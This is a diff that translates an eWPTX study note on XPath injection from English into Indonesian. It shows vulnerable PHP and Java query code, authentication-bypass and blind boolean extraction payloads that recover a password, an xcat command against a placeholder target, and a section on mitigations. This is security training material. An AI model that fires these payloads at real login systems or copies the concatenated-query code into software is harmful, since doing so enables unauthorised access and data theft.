@@ -3,14 +3,14 @@
 Status:
 
 Tags: [[eWPTX]] [[XML]]
-###### Prerequisites: [[XML Injection - Attack Types]]
+###### Prasyarat: [[XML Injection - Attack Types]]
 # XPath Injection
 
-## Overview
+## Gambaran singkat
 
-XPath injection occurs when untrusted input is inserted into an XPath query used to search an XML document. It is conceptually identical to SQL injection, but targets XML data stores instead of relational databases.
+XPath injection terjadi ketika input yang tidak tepercaya disisipkan ke query XPath yang dipakai untuk mencari data pada dokumen XML. Secara konsep mirip SQL injection, tetapi targetnya adalah data store berbasis XML (bukan database relasional).
 
-## Target XML Document
+## Dokumen XML target
 
 ```xml
 <?xml version="1.0"?>
@@ -33,7 +33,7 @@ XPath injection occurs when untrusted input is inserted into an XPath query used
 </users>
 ```
 
-## Vulnerable Code
+## Kode rentan
 
 **PHP:**
 ```php
@@ -55,13 +55,13 @@ XPathExpression expr = xpath.compile(query);
 NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
 ```
 
-## Authentication Bypass Payloads
+## Payload bypass autentikasi
 
 **Basic bypass (in username field):**
 ```
 ' or '1'='1
 ```
-Resulting query: `//users/user[username='' or '1'='1' and password='anything']`
+Query yang terbentuk: `//users/user[username='' or '1'='1' and password='anything']`
 
 **Full bypass (both fields):**
 ```
@@ -69,7 +69,7 @@ Username: ' or '1'='1
 Password: ' or '1'='1
 ```
 Query: `//users/user[username='' or '1'='1' and password='' or '1'='1']`
-Returns all users -- first match logs in (usually admin).
+Mengembalikan semua user — match pertama biasanya login (sering admin).
 
 **Target specific user:**
 ```
@@ -82,68 +82,70 @@ Query: `//users/user[username='admin' or '1'='1' and password='...']`
 admin']%00
 ```
 
-## Data Extraction
+## Ekstraksi data
 
-**Extract all usernames:**
+**Ambil semua username:**
 ```
 ' or 1=1]/username | //nothing['
 ```
 
-**Using `string-length()` to probe field lengths:**
+**Pakai `string-length()` untuk menguji panjang field:**
 ```
 ' or string-length(//users/user[1]/password)=6 or '1'='2
 ```
-Returns true if first user's password is 6 characters.
+Bernilai true jika password user pertama panjangnya 6.
 
-**Using `substring()` to extract character-by-character:**
+**Pakai `substring()` untuk ekstraksi karakter per karakter:**
 ```
 ' or substring(//users/user[1]/password,1,1)='s' or '1'='2
 ```
-Returns true if the first character of the first user's password is 's'.
+Bernilai true jika karakter pertama password user pertama adalah 's'.
 
 ## Blind XPath Injection
 
-When the application does not return query results directly, use boolean-based extraction (same logic as blind SQLi).
+Jika aplikasi tidak mengembalikan hasil query secara langsung, gunakan ekstraksi boolean-based (logikanya sama seperti blind SQLi).
 
 **Step 1: Determine node count**
+
+**Step 1: Tentukan jumlah node**
 ```
 ' or count(//users/user)=3 or '1'='2       --> true (3 users)
 ' or count(//users/user)=4 or '1'='2       --> false
 ```
 
-**Step 2: Determine string length**
+**Step 2: Tentukan panjang string**
 ```
 ' or string-length(//users/user[1]/password)>4 or '1'='2   --> true
 ' or string-length(//users/user[1]/password)>6 or '1'='2   --> false
 ' or string-length(//users/user[1]/password)=6 or '1'='2   --> true (length is 6)
 ```
 
-**Step 3: Extract characters one by one**
+**Step 3: Ekstrak karakter satu per satu**
 ```
 ' or substring(//users/user[1]/password,1,1)='s' or '1'='2   --> true
 ' or substring(//users/user[1]/password,2,1)='3' or '1'='2   --> true
 ' or substring(//users/user[1]/password,3,1)='c' or '1'='2   --> true
 ...
 ```
-Recovered password: `s3cr3t`
+Password yang didapat: `s3cr3t`
 
-## XPath vs SQL Injection Comparison
+## Perbandingan XPath vs SQL injection
 
-| Aspect               | SQL Injection         | XPath Injection          |
+| Aspek                | SQL Injection         | XPath Injection          |
 |----------------------|----------------------|--------------------------|
-| Data store           | Relational database  | XML document             |
-| Union-based          | UNION SELECT         | `|` (union operator)     |
-| Comments             | `--`, `/* */`        | None in XPath 1.0        |
+| Data store           | Database relasional  | Dokumen XML              |
+| Union-based          | UNION SELECT         | `|` (operator union)     |
+| Komentar             | `--`, `/* */`        | Tidak ada di XPath 1.0   |
 | Boolean blind        | AND 1=1              | or '1'='1'               |
-| String extraction    | SUBSTRING()          | substring()              |
-| No types/roles       | DB permissions apply  | Full document access     |
-| Stacked queries      | Possible (some DBs)  | Not possible             |
+| Ekstraksi string     | SUBSTRING()          | substring()              |
+| Tipe/role            | Ada izin DB           | Akses dokumen penuh      |
+| Stacked queries      | Mungkin (sebagian DB) | Tidak mungkin            |
 
-Key difference: XPath has **no access controls**. A successful injection always yields access to the entire XML document. There is no equivalent of database users or table permissions.
+Perbedaan kunci: XPath **tidak punya access control** seperti DB. Jika injection berhasil, biasanya aksesnya mencakup seluruh dokumen XML. Tidak ada padanan seperti user DB atau permission tabel.
 
-## Tooling
+## Tools
 
-**xcat** -- automated blind XPath extraction:
+**xcat** — otomasi ekstraksi blind XPath:
 ```bash
 # Install
 pip install xcat
@@ -154,9 +156,9 @@ xcat --method POST --body "username=*&password=test" \
      http://target/login
 ```
 
-xcat automates the substring/string-length brute force process and supports XPath 2.0 features where available.
+xcat mengotomasi brute force substring/string-length dan mendukung fitur XPath 2.0 jika tersedia.
 
-## Mitigation
+## Mitigasi
 
 **Parameterized XPath queries (Java):**
 ```java
@@ -175,11 +177,11 @@ String query = "//users/user[username=$username and password=$password]";
 XPathExpression expr = xpath.compile(query);
 ```
 
-**Input validation:**
-- Reject or escape XPath special characters: `'`, `"`, `/`, `[`, `]`, `(`, `)`, `=`
-- Whitelist expected input patterns (alphanumeric only for usernames)
-- Never concatenate user input into XPath expressions directly
+**Validasi input:**
+- Tolak atau escape karakter spesial XPath: `'`, `"`, `/`, `[`, `]`, `(`, `)`, `=`
+- Whitelist pola input yang diharapkan (mis. alfanumerik untuk username)
+- Jangan pernah concatenate input user langsung ke ekspresi XPath
 
-**Architecture:**
-- Prefer a relational database with parameterized queries over XML flat-file storage
-- If XML is required, use a dedicated XML database (BaseX, eXist-db) with proper parameterization support
+**Arsitektur:**
+- Lebih baik pakai database relasional + query ter-parameterisasi daripada menyimpan data sebagai XML flat-file
+- Jika XML memang wajib, gunakan XML database (BaseX, eXist-db) yang mendukung parameterisasi dengan benar
